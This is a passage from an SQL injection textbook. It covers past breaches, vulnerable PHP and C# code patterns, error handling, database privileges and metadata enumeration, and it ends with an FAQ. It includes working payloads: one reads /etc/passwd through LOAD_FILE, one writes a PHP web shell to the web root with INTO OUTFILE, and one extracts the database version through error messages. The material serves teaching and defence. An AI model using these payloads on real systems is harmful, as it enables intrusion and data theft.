Web site defacements. The site shows \nthat a large number of high- profile Web sites and Web applications have been hacked over the \nyears due to the presence of exploitable SQL injection vulnerabilities. Web sites within the Microsoft domain have been defaced some 46 times or more going back as far as 2001. You can view a comprehensive list of hacked Microsoft sites o nline at Zone -H (www.zone -\nh.org/content/view/14980/1/ ). \nThe traditional press also likes to heavily publicize any security data breaches, especially \nthose that affect well -known and high -profile c ompanies. Here is a list of some of these:  \n• In February 2002, Jeremiah Jacks ( www.securityfocus.com/news/346) discovered that \nGuess.com was vulnerable to SQL injection. He gained access to at least 200 ,000 customers’ \ncredit card details.  \n• In June 2003, Jeremiah Jacks struck again, this time at PetCo.com \n(www.securityfocus.com/news/6194), where he gained access to 500,000 credit card details \nvia an SQL injection flaw.  \n• On June 17, 2005, MasterCard alerted some of its customers to a breach in the security of \nCard Systems Solutions. At the time, it was the largest known breach of its kind. By exploiting an SQL injection flaw ( www.ftc.gov/os/caselist/0523148/0523148complaint.pdf ), \na hacker gained access to 40 million credit card details.  \n• In December 2005, Guidance  Software, developer of EnCase, discovered that a hacker had \ncompromised its database server via an SQL injection flaw (www.ftc.gov/os/caselist/0623057/0623057complaint.pdf ), expos ing the financial records of \n3800 customers.  \n• Circa December 2006, the US discount retailer TJX was successfully hacked and the \nattackers stole millions of payment card details from the TJX databases.  \n• In August 2007, the United Nations Web site ( www.un.org ) was defaced via SQL injection \nvulnerability by an attacker in order to display anti -US messages \n(http://news.cnet.com/8301- 10784_3- 9758843- 7.html ). \n• In 2008, the Asprox botnet leverages SQL injection flaws for mass drive by malware \ninfections in order to grow its botnet ( http://en.wikipedia.org/wiki/Asprox ). The number of \nexploited Web pages is estimate d at 500,000. \n• In February 2009, a group of Romanian hackers in separate incidents allegedly broke into \nKaspersky, F -Secure, and Bit -Defender Web sites by use of SQL injection attacks. The \nRomanians went on to allegedly hack many other high profile Web si tes such as RBS \nWorldPay, CNET.com, BT.com, Tiscali.co.uk, and national -lottery.co.uk.  \n• On August 17, 2009, the US Justice Department charged an American citizen Albert \nGonzalez and two unnamed Russians with the theft of 130 million credit card numbers us ing \na SQL injection attack. Among the companies compromised were credit card processor \nHeartland Payment Systems, convenience store chain 7 -Eleven, and supermarket chain \nHannaford Brothers.  \n• In February 2011, hbgaryfederal.com was found by the Anonymous g roup to be vulnerable \nto a SQL injection flaw within its CMS.  \n• In April 2011, Barracuda Networks Web site (barracudanetworks.com) was found to be \nvulnerable to SQL injection and the hacker responsible for the compromise published database dumps online —inc luding the authentication credentials and hashed passwords for \nCMS users!  \n• In May 2011, LulzSec compromised several Sony Web sites (sonypictures.com, \nSonyMusic.gr, and SonyMusic.co.jp) and proceeded to dump the database contents online for their amusement . LulzSec says it accessed the passwords, e- mail addresses, home \naddresses and dates of birth of one million users. The group says it also stole all admin details of Sony Pictures, including passwords. 75,000 music codes and 3.5 million music coupons were also accessed, according to the press release.  \n• In May 2011, LulzSec compromised the Public Broadcast Service (PBS) Web site —in \naddition to dumping numerous SQL databases through a SQL injection attack, LulzSec \ninjected a new page into PBS’s Web site. Lul zSec posted usernames and hashed passwords \nfor the database administrators and users. The group also posted the logins of all PBS local affiliates, including their plain text passwords.  \n• In June 2011, Lady Gaga’s fan site was hacked and according to a sta tement released at the \ntime “The hackers took a content database dump from www.ladygaga.co.uk and a section of \ne-mail, first name, and last name records were accessed. There were no passwords or \nfinancial information taken” —http://www.mirror.co.uk/celebs/news/2011/07/16/lady -gaga -\nwebsite -hacked -and-fans-details -stolen -115875- 23274356. \nHisto rically, attackers would compromise a Web site or Web application to score points \nwith other hacker groups, to spread their particular political viewpoints and messages, to show off their “mad skillz,” or simply to retaliate against a perceived slur or injustice. Today, however, an attacker is much more likely to exploit a Web application to gain financially and make a profit. A wide range of potential groups of attackers are on the Internet today, all with differing motivations (I’m sure everyone reading t his book is more than aware of who LulzSec \nand Anonymous are!). They range from individuals looking simply to compromise systems \ndriven by a passion for technology and a “hacker” mentality, focused criminal organizations seeking potential targets for financial proliferation, and political activists motivated by personal or group beliefs, to disgruntled employees and system administrators abusing  their \nprivileges and opportunities for a variety of goals. A SQL injection vulnerability in a Web site or Web application is often all an attacker needs to accomplish his goal.  \nStarting in early 2008, hundreds of thousands of Web sites were compromised by means of \nan automated SQL injection attack (Asprox). A tool was used to search for potentially vulnerable applica tions on the Internet, and when a vulnerable site was found the tool \nautomatically exploited them. When the exploit payload was delivered it executed an iterative SQL loop that located every user -created table in the remote database and then appended every  \ntext column within the table with a malicious client- side script. As most database -driven Web \napplications use data in the database to dynamically construct Web content, eventually the script would be presented to a user of the compromised Web site or application. The tag would instruct any browser that loads an infected Web page to execute a malicious script that was hosted on a remote server. The purpose of this was to infect as many hosts with malware as possible. It was a very effective attack. Signifi cant sites such as ones operated by government \nagencies, the United Nations, and major corporations were compromised and infected by this \nmass attack. It is difficult to ascertain exactly how many client computers and visitors to these \nsites were in turn infected or compromised, especially as the payload that was delivered was customizable by the individual launching the attack. \nAre You Owned?  \nIt Couldn’t Happen to Me, Could It?  \nI have assessed many Web applications over the years, and I used to find that o ne in every three applications I \ntested was vulnerable to SQL injection. To some extent this is still true, however I do feel that I have to work that \nmuch harder for my rewards these days. This could be down to a number of variables that are far too diffi cult to \nquantify, however I genuinely believe that with the improvement in the general security of common development \nframeworks and developer education stratagems, developers are making a concentrated effort to avoid introducing \nthese flaws into their app lications. Presently I am seeing SQL injection flaws in technologies and/or applications \nproduced by inexperienced developers coding for emerging technologies and/or platforms but then again the \nAsprox botnet is still going strong! The impact of the vulner ability varies among applications and platforms, but \nthis vulnerability is present in many applications today. Many applications are exposed to hostile environments \nsuch as the Internet without being assessed for vulnerabilities. Defacing a Web site is a v ery noisy and noticeable \naction and is usually performed by “script kiddies” to score points and respect among other hacker groups. More \nserious and motivated attackers do not want to draw attention to their actions. It is perfectly feasible that \nsophistic ated and skilled attackers would use an SQL injection vulnerability to gain access to and compromise \ninterconnected systems. I have, on more than one occasion, had to inform a client that their systems have been \ncompromised and are actively being used by h ackers for a number of illegal activities. Some organizations and \nWeb site owners may never know whether their systems have been previously exploited or whether hackers \ncurrently have a back door into their systems.  \nUnderstanding How It Happens  \nSQL is the standard language for accessing Microsoft SQL Server, Oracle, MySQL, Sybase, and Informix (as well as other) database servers. Most Web applications need to interact with a database, and most Web application programming languages, such as ASP, C#, .NET, Ja va, \nand PHP, provide programmatic ways of connecting to a database and interacting with it. SQL injection vulnerabilities most commonly occur when the Web application developer does not ensure that values received from a Web form, cookie, input parameter, and so forth are validated before passing them to SQL queries that will be executed on a database server. If an attacker can control the input that is sent to an SQL query and manipulate that input so that the \ndata is interpreted as a code instead of as data, the attacker may be able to execute the code on \nthe back -end database.  \nEach programming language offers a number of different ways to construct and execute \nSQL statements, and developers often use a combination of these methods to achieve different goals. A lot of Web sites that offer tutorials and code examples to help appli cation developers \nsolve common coding problems often teach insecure coding practices and their example code is also often vulnerable. Without a sound understanding of the underlying database that they are interacting with or a thorough understanding and aw areness of the potential security issues \nof the code that is being developed, application developers can often produce inherently insecure applications that are vulnerable to SQL injection. This situation has been improving over time and now a Google searc h for how to prevent SQL injection in your language or \ntechnology of choice, will usually present with a large number of valuable and useful resources that do offer good advice on the correct  way to do things. On several tutorial sites you can still \nfind a n insecure code, but usually if you look through the comments you will find warnings \nfrom more security savvy community contributors. Apple and Android offer good advice to developers moving to the platforms on how to develop the code securely and these do contain \nsome coverage with regard to preventing SQL injection vulnerabilities; similarly the HTML5 communities offer many warnings and some good security advice to early adopters. \nDynamic String Building  \nDynamic string building is a programming technique that enables developers to build SQL statements dynamically at runtime. Developers can create general -purpose, flexible \napplications by using dynamic SQL. A dynamic SQL statement is constructed at execution time, for which different conditions generate dif ferent SQL statements. It can be useful to \ndevelopers to construct these statements dynamically when they need to decide at runtime what fields to bring back from, say, SELECT  statements, the different criteria for queries, and \nperhaps different tables to query based on different conditions.  \nHowever, developers can achieve the same result in a much more secure fashion if they use \nparameterized queries. Parameterized queries are queries that have one or more embedded \nparameters in the SQL statement. Paramete rs can be passed to these queries at runtime; \nparameters containing embedded user input would not be interpreted as commands to execute, and there would be no opportunity for code to be injected. This method of embedding parameters into SQL is more efficie nt and a lot more secure than dynamically building and \nexecuting SQL statements using string -building techniques. \nThe following PHP code shows how some developers build SQL string statements \ndynamically from user input. The statement selects a data record from a table in a database. \nThe record that is returned depends on the value that the user is entering being present in at least one of the records in the database:  \n// a dynamically built sql string statement in PHP  \n$query = “SELECT ∗  FROM table WHERE field = ‘$_GET[“input”]’”;  \n// a dynamically built sql string statement in .NET  \nquery = “SELECT ∗  FROM table WHERE field = ‘” + request.getParameter(“ input”) + “’”; \nOne of the issues with building dynamic SQL statements such as this is that if the code does \nnot validate or encode the input before passing it to the dynamically created statement, an \nattacker could enter SQL statements as input to the application and have his SQL statements passed to the database and executed. Here is the SQL statement that this co de builds:  \nSELECT ∗ FROM TABLE WHERE FIELD = ‘input’  \nIncorrectly Handled Escape Characters  \nSQL databases interpret the quote character (‘) as the boundary between the code and data. They assume that anything following a quote is a code that it needs to run and anything encapsulated by a quote is data. Therefore, you can quickly tell whether a We b site is \nvulnerable to SQL injection by simply typing a single quote in the URL or within a field in the Web page or application. Here is the source code for a very simple application that passes user input directly to a dynamically created SQL statement: \n// build dynamic SQL statement  \n$SQL = “SELECT ∗  FROM table WHERE field = ‘$_GET[“input”]’;”; \n// execute sql statement  \n$result = mysql_query($SQL);  \n// check to see how many rows were returned from the database  \n$rowcount = mysql_num_rows($result);  \n// iterate through the record set returned  \n$row = 1;  \nwhile ($db_field = mysql_fetch_assoc($result)) {  \n if ($row <= $rowcount){  \n  print $db_field[$row]. “<BR>”;  \n  $row++;  \n  } \n } \nIf you were to enter the single- quote character as input to the application, you may be \npresented with either one of the following errors; the result depends on a number of \nenvironmental factors, such as programming language and database in use, as well as  \nprotection and defense technologies implemented:  \nWarning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result resource  \nYou may receive the preceding error or the one that follows. The following error provides \nuseful information on how the S QL statement is being formulated:  \nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server \nversion for the right syntax to use near ‘‘VALUE’’  \nThe reason for the error is that the single -quote character has been interpret ed as a string \ndelimiter. Syntactically, the SQL query executed at runtime is incorrect (it has one too many string delimiters), and therefore the database throws an exception. The SQL database sees the single -quote character as a special character (a stri ng delimiter). The character is used in SQL \ninjection attacks to “escape” the developer’s query so that the attacker can then construct his own queries and have them executed. \nThe single -quote character is not the only character that acts as an escape char acter; for \ninstance, in Oracle, the blank space ( ), double pipe (||), comma (,), period (.), ( ∗/), and double -\nquote characters ( “) have special meanings. For example:  \n-- The pipe [|] character can be used to append a function to a value.  \n-- The function will be executed and the result cast and concatenated. \nhttp://victim.com/id=1||utl_inaddr.get_host_address(local) -- \n-- An asterisk followed by a forward slash can be used to terminate a  \n-- comment and/or optimizer hint in Oracle  \nhttp://victim.com/hint = ∗/ from dual—  \nIt is important to become familiar with all of the idiosyncrasies of the database you are \nattacking and/or defending, for example an opening delimiter in SAP MAX DB (SAP DB) \nconsists of a less than character and an exclamation mark:  \nhttp://www.victim.com/id=1 union select operating system from sysinfo.version-- <! \nSAP MAX DB (SAP DB) is not a database I come across often, but the information above \nhas since come in very useful on more than one occasion.  \nIncorrectly Handled Types  \nBy now, some of you may be thinking that to avoid being exploited by SQL injection, simply escaping or validating input to remove the single -quote character would suffice. Well, that’s a \ntrap which lots of Web application developers have fallen into. As I explained earlier, the \nsingle -quote character is interpreted as a string delimiter and is used as the boundary between \ncode and data. When dealing with numeric data, it  is not necessary to encapsulate the data \nwithin quotes; otherwise, the numeric data would be treated as a  string.  \nHere is the source code for a very simple application that passes user input directly to a \ndynamically created SQL statement. The script accepts a numeric parameter ( $userid) and \ndisplays information about that user. The query assumes that the par ameter will be an integer \nand so is written without quotes:  \n// build dynamic SQL statement  \n$SQL = “SELECT ∗  FROM table WHERE field = $_GET[ “userid”]”; \n// execute sql statement  \n$result = mysql_query($SQL);  \n// check to see how many rows were returned from the database  \n$rowcount = mysql_num_rows($result);  \n// iterate through the record set returned  \n$row = 1;  \nwhile ($db_field = mysql_fetch_assoc($result)) {  \n if ($row <= $rowcount){  \n  print $db_field[$row]. “<BR>”;  \n  $row++;  \n  } \n } \nMySQL provides a function called LOAD_FILE  that reads a file and returns the file contents \nas a string. To use this function, the file must be located on the database server host and the \nfull pathname to the file must be provided as input to the function. The calling user must also have the FILE privilege. The following statement, if entered as input, may allow an attacker to read the contents of the /etc/passwd file, which contains user attributes and usernames for system users:  \n1 UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)--  \nMySQL also has a built -in command that you can use to create and write system files. You \ncan use the following command to write a Web shell to the Web root to install a remotely accessible interactive Web shell:  \n1 UNION SELECT “<? system ($_REQUEST[‘cmd’]); ?>” INTO OUTFILE \n“/var/www/html/victim.com/cmd.php” – \nFor the LOAD_FILE  and SELECT INTO OUTFILE  commands to work, the MySQL user \nused by the vulnerable application must have been granted the FILE permission. For example, by default, the  root user has this permission on. FILE is an administrative privilege.  \nThe attacker’s input is directly interpreted as SQL syntax; so, there is no need for the \nattacker to escape the query with the single- quote character. Here is a clearer depiction of th e \nSQL statement that is built:  \nSELECT ∗ FROM TABLE  \nWHERE  \nUSERID = 1 UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)—  \nIncorrectly Handled Query Assembly  \nSome complex applications need to be coded with dynamic SQL statements, as the table or \nfield that needs to be queried may not be known at the development stage of the application or \nit may not yet exist. An example is an application that interacts with a large database that stores data in tables that are created periodically. A fictitious example may be an application that returns data for an employee’s time sheet. Each employee’s time sheet data is entered into a new table in a format that contains that m onth’s data (for January 2011 this would be in the \nformat employee_employee- id_01012011). The Web developer needs to allow the statement to \nbe dynamically created based on the date that the query is executed.  \nThe following source code for a very simple app lication that passes user input directly to a \ndynamically created SQL statement demonstrates this. The script uses application -generated \nvalues as input; that input is a table name and three -column names. It then displays information \nabout an employee. The  application allows the user to select what data he wishes to return; for \nexample, he can choose an employee for which he would like to view data such as job details, day rate, or utilization figures for the current month. Because the application already g enerated \nthe input, the developer trusts the data; however, it is still user -controlled, as it is submitted via \na GET  request. An attacker could submit his table and field data for the application- generated \nvalues:  \n// build dynamic SQL statement  \n$SQL = “SE LECT”. $_GET[“column1”]. “,”. $_GET[“column2”]. “,”. $_GET[“column3”]. “ FROM ”. \n$_GET[“table”];  \n// execute sql statement  \n$result = mysql_query($SQL);  \n// check to see how many rows were returned from the database  \n$rowcount = mysql_num_rows($result);  \n// iterate through the record set returned  \n$row = 1;  \nwhile ($db_field = mysql_fetch_assoc($result)) {if ($row <= $rowcount){print \n$db_field[$row]. “<BR>”;  \n$row++;  \n} \n} \nIf an attacker was to manipulate the HTTP request and substitute the users value for the \ntable name and the user , password, and Super_priv  fields for the application -generated column \nnames, he may be able to display the usernames and passwords for the database users on the \nsystem. Here is the URL that is built when using the appl ication:  \n• http://www.victim.com/user_details.php?table=users&column1=user&column2=password&\ncolumn3=Super_priv  \nIf the injection were success ful, the following data would be returned instead of the time \nsheet data. This is a very contrived example; however, real -world  applications have been built \nthis way. I have come across them on more than one occasion:  \n+--------------+ ---------------------- --------------+ ------------+  \n| user | password | Super_priv |  \n+--------------+ -------------------------------------+ ------------ + \n| root | ∗ 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 | Y |  \n| sqlinjection | ∗ 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 | N |  \n| 0wned | ∗2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 | N |  \n+--------------+ -------------------------------------------+ ------------ + \nIncorrectly Handled Errors  \nImproper handling of errors can introduce a variety of security problems for a Web site. The \nmost com mon problem occurs when detailed internal error messages such as database dumps \nand error codes are displayed to the user or attacker. These messages reveal implementation details that should never be revealed. Such details can provide an attacker with imp ortant clues \nregarding potential flaws in the site. Verbose database error messages can be used to extract information from databases on how to amend or construct injections to escape the developer’s query or how to manipulate it to bring back extra data, or in some cases, to dump all of the data in a database (Microsoft SQL Server).  \nThe simple example application that follows is written in C# for ASP.NET and uses a \nMicrosoft SQL Server database server as its back end, as this database provides the most verbose of error messages. The script dynamically generates and executes an SQL statement \nwhen the user of the application selects a user identifier from a drop -down list:  \nprivate void SelectedIndexChanged(object sender, System.EventArgs e)  \n { \n  // Create a Select statement that searches for a record  \n  // matching the specific id from the Value property.  \n  string SQL;  \n  SQL = “SELECT ∗ FROM table ” ; \n  SQL += “WHERE ID=” + UserList.SelectedItem.Value + “”;  \n  // Define the ADO.NET objects.  \n  OleDbConnection con = new OleDbConnection(connectionString);  \n  OleDbCommand cmd = new OleDbCommand(SQL, con);  \n  OleDbDataReader reader;  \n  // Try to open database and read information.  \n  try \n  { \n   con.Open();  \n   reader = cmd.ExecuteReader();  \n   reader.Read();  \n   lblResults.Text = “<b>” + reader[“LastName”];  \n   lblResults.Text += “, ” + reader[“FirstName”] + “</b><br>”;  \n   lblResults.Text += “ID: ” + reader[“ID”] + “<br>”;  \n   reader.Close();  \n  } \n  catch (Exception err)  \n  { \n   lblResults.Text = “Error getting data. ”;  \n   lblResults.Text += err.Message;  \n  } \n  finally  \n  { \n   con.Close();  \n  } \n } \nIf an attacker was to manipulate the HTTP request and substitute the expected ID value for \nhis own SQL statement, he may be able to use the informative SQL err or messages to learn \nvalues in the database. For example, if the attacker entered the following query, execution of \nthe SQL statement would result in an informative error message being displayed containing the version of the RDBMS that the Web application is using:  \n‘ and 1 in (SELECT @@version) – \nAlthough the code does trap error conditions, it does not provide custom and generic error \nmessages. Instead, it allows an attacker to manipulate the application and its error messages for information. Chapter 4  provides more detail on how an attacker can use and abuse this \ntechnique and situation. Here is the error that would be returned:  \nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’  \n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value \n‘Microsoft SQL Server 2000 -  8.00.534 (Intel X86) Nov 19 2001 13:23:50 Copyright (c) 1988-\n2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0 (Build 2195: Service Pack \n3)’ to a column of data type int.  \nIncorrectly Handled Multiple Submissions  \nWhite listing is a technique that means all characters should be disallowed, except for those \nthat are in the white list. The white -list approach to validating input is  to create a list of all \npossible characters that should be allowed for a given input, and to deny anything else. It is recommended that you use a white -list approach as opposed to a black list. Black listing is a \ntechnique that means all characters should  be allowed, except those that are in the black list. \nThe black -list approach to validating input is to create a list of all possible characters and their \nassociated encodings that could be used maliciously, and to reject their input. So many attack classes exist that can be represented in a myriad of ways that effective maintenance of such a list is a daunting task. The potential risk associated with using a list of unacceptable characters is that it is always possible to overlook an unacceptable character  when defining the list or to \nforget one or more alternative representations of that unacceptable character.  \nA problem can occur on large Web development projects whereby some developers will \nfollow this advice and validate their input, but other developer s will not be as meticulous. It is \nnot uncommon for developers, teams, or even companies to work in isolation from one another and to find that not everyone involved with the development follows the same standards. For instance, during an assessment of an application, it is not uncommon to find that almost all of \nthe input entered is validated; however, with perseverance, you can often locate an input that a \ndeveloper has forgotten to validate.  \nApplication developers also tend to design an application around a user and attempt to guide \nthe user through an expected process flow, thinking that the user will follow the logical steps they have laid out. For instance, they expect that if a user has reached the third form in a series of forms, the user must have c ompleted the first and second forms. In reality, though, it is often \nvery simple to bypass the expected data flow by requesting resources out of order directly via their URLs. Take, for example, the following simple application:  \n// process form 1  \nif ($_GET[“form”] = “form1”){  \n // is the parameter a string?  \n if (is_string($_GET[“param”])) {  \n  // get the length of the string and check if it is within the  \n  // set boundary?  \n  if (strlen($_GET[“param”]) < $max){  \n   // pass the string to an external validator  \n   $bool = validate(input_string, $_GET[“param”]);  \n   if ($bool = true) {  \n    // continue processing  \n    } \n   } \n } \n} \n// process form 2  \nif ($_GET[“form”] = “form2”){  \n // no need to validate param as form1 would have validated it for us  \n $SQL = “SELECT ∗  FROM TABLE WHERE ID = $_GET[“ param”]”; \n // execute sql statement  \n $result = mysql_query($SQL);  \n // check to see how many rows were returned from the database  \n $rowcount = mysql_num_rows($result);  \n $row = 1;  \n // iterate through the record set returned  \n while ($db_field = mysql_fetch_assoc($result)) {  \n  if ($row <= $rowcount){  \n   print $db_field[$row]. “<BR>”;  \n   $row++;  \n   } \n  } \n } \nThe application developer does not think that the second form needs to validate the input, as \nthe first form will have performed the input validation. An attacker could call the second form \ndirectly, without using the first form, or he could simply submit valid data as input into the first form and then manipulate the data as it is su bmitted to the second form. The first URL \nshown here would fail as the input is validated; the second URL would result in a successful SQL injection attack, as the input is not validated:  \n[1] http://www.victim.com/form.php?form=form1&param=’  SQL Failed --  \n[2] http://www.victim.com/form.php?form=form2&param=’  SQL Success -- \nInsecure Database Configuration  \nYou can mitigate the access that can be leveraged, the amount of data that can be stolen or \nmanipulated, the level of access to interconnected systems, and the damage that can be caused by an SQL injection attack, in a number of ways. Securing the application code is the first place to start; however, you should not overlook the database itself. Databases come with a \nnumber of default users preinstalled. Microsoft SQL Server uses the infamous “sa” database system administrator account, MySQL uses the “root” and “anonymous” user acc ounts, and \nwith Oracle, the accounts SYS, SYSTEM, DBSNMP, and OUTLN are often created by default when a database is created. These aren’t the only accounts, just some of the better -known ones; \nthere are a lot more! These accounts are also preconfigured wit h default and well -known \npasswords.  \nSome system and database administrators install database servers to execute as the root, \nSYSTEM, or Administrator privileged system user account. Server services, especially database servers, should always be run as an unprivileged user (in a chroot environment, if possible) to reduce potential damage to the operating system and other processes in the event of a successful attack against the database. However, this is not possible for Oracle on Windows, as it must run wit h SYSTEM privileges. \nEach type of database server also imposes its own access control model assigning various \nprivileges to user accounts that prohibit, deny, grant, or enable access to data and/or the \nexecution of built -in stored procedures, functionality , or features. Each type of database server \nalso enables, by default, functionality that is often surplus to requirements and can be leveraged by an attacker (xp_cmdshell, OPENROWSET, LOAD_FILE, ActiveX, Java support, etc.). Chapters 4 –7 will detail attacks that leverage these functions and features.  \nApplication developers often code their applications to connect to a database using one of \nthe built -in privileged accounts instead of  creating specific user accounts for their applications \nneeds. These powerful accounts can perform a myriad of actions  on the database that are \nextraneous to an application’s requirement. When an attacker exploits an SQL injection vulnerability in an appli cation that connects to the database with a privileged account, he can \nexecute code on the database with the privileges of that account. Web application developers should work with database administrators to operate a least -privilege model for the \napplicat ion’s database access and to separate privileged roles as appropriate for the functional \nrequirements of the application. \nIn an ideal world, applications should also use different database users to perform SELECT , \nUPDATE , INSERT , and similar commands. In t he event of an attacker injecting code into a \nvulnerable statement, the privileges afforded would be minimized. Most applications do not \nseparate privileges, so an attacker usually has access to all data in the database and has SELECT , INSERT , UPDATE , DELE TE, EXECUTE, and similar privileges. These excessive \nprivileges can often allow an attacker to jump between databases and access data outside the application’s data store.  \nTo do this, though, he needs to know what else is available, what other databases ar e \ninstalled, what other tables are there, and what fields look interesting! When an attacker exploits an SQL injection vulnerability he will often attempt to access database metadata. Metadata is data about the data contained in a database, such as the nam e of a database or \ntable, the data type of a column, or access privileges. Other terms that sometimes are used for this information are data dictionary  and system catalog. For MySQL Servers (Version 5.0 or \nlater) this data is held in the INFORMATION_SCHEMA  virtual database and can be accessed \nby the SHOW DATABASES  and SHOW TABLES  commands. Each MySQL user has the right \nto access tables within this database, but can see only the rows in the tables that correspond to objects for which the user has the proper access privileges. Microsoft SQL Server has a similar concept and the metadata can be accessed via the INFORMATION_SCHEMA  or with system \ntables ( sysobjects , sysindexkeys , sysindexes , syscolumns , systypes , etc.), and/or with system \nstored procedures; SQL Server 2005 introduced some catalog views called “sys.∗ ” and restricts \naccess to objects for which the user has the proper access privileges. Each Microsoft SQL Server user has the right to access tables w ithin this database and can see all the rows in the \ntables regardless of whether he has the proper access privileges to the tables or the data that are referenced.  \nMeanwhile, Oracle provides a number of global built -in views for accessing Oracle \nmetadata ( ALL_TABLES , ALL_TAB_COLUMNS , etc.). These views list attributes and objects \nthat are accessible to the current user. In addition, equivalent views that are prefixed with USER_  show only the objects owned by the current user (i.e. a more restricted view of \nmetadata), and views that are prefixed with DBA_  show all objects in the database (i.e. an \nunrestricted global view of metadata for the database instance). The DBA_  metadata functions \nrequire database administrator (DBA) privileges. Here is an example of t hese statements:  \n-- Oracle statement to enumerate all accessible tables for the current user  \nSELECT OWNER, TABLE_NAME FROM ALL_TABLES ORDER BY TABLE_NAME;  \n-- MySQL statement to enumerate all accessible tables and databases for the  \n-- current user  \nSELECT table_schema, table_name FROM information_schema.tables;  \n-- MSSQL statement to enumerate all accessible tables using the system  \n-- tables  \nSELECT name FROM sysobjects WHERE xtype = ‘U’;  \n-- MSSQL statement to enumerate all accessible tables using the catalog  \n-- views  \nSELECT name FROM sys.tables;  \nIt is not possible to hide or revoke access to the INFORMATION_SCHEMA virtual database \nwithin a MySQL database, and it is not possible to hide or revoke access to the data dictionary \nwithin an Oracle database, as it is a view. You can modify the view to restrict access, but Oracle does not recommend this. It is possible to revoke access to the INFORMATION_SCHEMA , system , and sys.\n∗ tables within a Microsoft SQL Server database. \nThis, however, can break some funct ionality and can cause issues with some applications that \ninteract with the database. The better approach is to operate a least -privilege model for the \napplication’s database access and to separate privileged roles as appropriate for the functional require ments of the application. \nSummary  \nIn this chapter, you learned some of the many vectors that cause SQL injection, from the design and architecture of an application, to the developer behaviors and coding patterns that are used in building the application. We discussed how the popular multiple -tier ( n-tier) \narchitecture for Web applications will commonly have a storage tier with a database that is interacted with by database queries generated at another tier, often in part with user -supplied \ninformation. And we discussed that dynamic string building (otherwise known as dynamic \nSQL), the practice of assembling the SQL query as a string concatenated together with user -\nsupplied input, causes SQL injection as the attacker can change the logic and structure of the  \nSQL query to execute database commands that are very different from those that the developer \nintended. \nIn the forthcoming chapters, we will discuss SQL injection in much more depth, both in \nfinding and in identifying SQL injection ( Chapters 2 and 3), SQL injection attacks and what \ncan be done through SQL injection ( Chapters 4 –7), how to defend against SQL i njection \n(Chapters 8  and 9 ), and how to find out if you’ve been exploited or recover from SQL injection \n(Chapter 10). And finally, in Chapter 11, we present a number of handy reference resources, \npointers, and cheat sheets intended to help you quickly find the information you’re looking for.  \nIn the meantime, read through and try out this chapter’s exa mples again so that you cement \nyour understanding of what SQL injection is and how it happens. With that knowledge, you’re already a long way toward being able to find, exploit, or fix SQL injection out there in the real world!  \nSolutions Fast Track  \nUnderst anding How Web Applications Work \n• A Web application is an application that is accessed via a Web browser over a network such \nas the Internet or an intranet. It is also a computer software application that is coded in a browser -supported language (such as HTML, JavaScript, Java, etc.) and relies on a common \nWeb browser to render the application executable.  \n• A basic database -driven dynamic Web application typically consists of a back -end database \nwith Web pages that contain server -side script written in a p rogramming language that is \ncapable of extracting specific information from a database depending on various dynamic interactions.  \n• A basic database- driven dynamic Web application commonly has three tiers: the presentation \ntier (a Web browser or rendering engine), the logic tier (a programming language such as C#, ASP, .NET, PHP, JSP, etc.), and a storage tier (a database such as Microsoft SQL Server, MySQL, Oracle, etc.). The Web browser (the presentation tier: Internet Explorer, Safari, Firefox, etc.) sen ds requests to the middle tier (the logic tier), which services the requests by \nmaking queries and updates against the database (the storage tier).  \nUnderstanding SQL Injection \n• SQL injection is an attack in which SQL code is inserted or appended into appl ication/user \ninput parameters that are later passed to a back -end SQL server for parsing and execution. \n• The primary form of SQL injection consists of direct insertion of the code into parameters \nthat are concatenated with SQL commands and executed.  \n• Whe n an attacker is able to modify an SQL statement, the process will run with the same \npermissions as the component that executed the command (e.g. database server, application \nserver, or Web server), which is often highly privileged.  \nUnderstanding How It Ha ppens  \n• SQL injection vulnerabilities most commonly occur when the Web application developer \ndoes not ensure that values received from a Web form, cookie, input parameter, and so forth are validated or encoded before passing them to SQL queries that will be executed on a database server.  \n• If an attacker can control the input that is sent to an SQL query and manipulate that input so \nthat the data is interpreted as code instead of as data, he may be able to execute code on the back -end database.  \n• Without a sound understanding of the underlying database that they are interacting with or a \nthorough understanding and awareness of the potential security issues of the code that is being developed, application developers can often produce inherently insecure appli cations \nthat are vulnerable to SQL injection.  \nFrequently Asked Questions  \nQ: What is SQL injection?  \nA: SQL injection is an attack technique used to exploit the code by altering back -end SQL \nstatements through manipulating input. \nQ: Are all databases vulnerable to SQL injection?  \nA: To varying degrees, most databases are vulnerable.  \nQ: What is the impact of an SQL injection vulnerability?  \nA: This depends on many variables; however, potentially an attacker can manipulate data in \nthe dat abase, extract much more data than the application should allow, and possibly execute \noperating system commands on the database server. \nQ: Is SQL injection a new vulnerability?  \nA: No. SQL injection has probably existed since SQL databases were first connec ted to Web \napplications. However, it was brought to the attention of the public on Christmas Day 1998.  \nQ: Can I really get into trouble for inserting a quote character (‘) into a Web site?  \nA: Yes (depending on the jurisdiction), unless you have a legitimat e reason for doing so (e.g. if \nyour name has a single -quote mark in it, such as O’Shea).  \nQ: How can code be executed because someone prepends his input with a quote character?  \nA: SQL databases interpret the quote character as the boundary between the code and data. \nThey assume that anything following a quote is a code that it needs to run and anything \nencapsulated by a quote is data.  \nQ: Can Web sites be immune to SQL injection if they do not allow the quote character to be \nentered?  \nA: No. There are a myriad  of ways to encode the quote character so that it is accepted as input, \nand some SQL injection vulnerabilities can be exploited without using it at all. Also, the quote character is not the only character that can be used to exploit SQL injection vulnerabi lities; a \nnumber of characters are available to an attacker, such as the double pipe (||) and double quote (“), among others.  \nQ: Can Web sites be immune to SQL injection if they do not use the GET  method?  \nA: No. POST  parameters are just as easily manipulat ed. \nQ: My application is written in PHP/ASP/Perl/.NET/Java, etc. Is my chosen language \nimmune?  \nA: No. Any programming language that does not validate input before passing it to a \ndynamically created SQL statement is potentially vulnerable; that is, unless it uses parameterized queries and bind variables.  \nChapter 2  \nTesting for SQL Injection  \nRodrigo Marcos Alvarez  \nSolutions in this chapter:  \n• Finding SQL Injection  \n• Confirming SQL Injection  \n• Automating SQL Injection Discovery  \nIntroduction  \nAs the presence of SQL injection is commonly 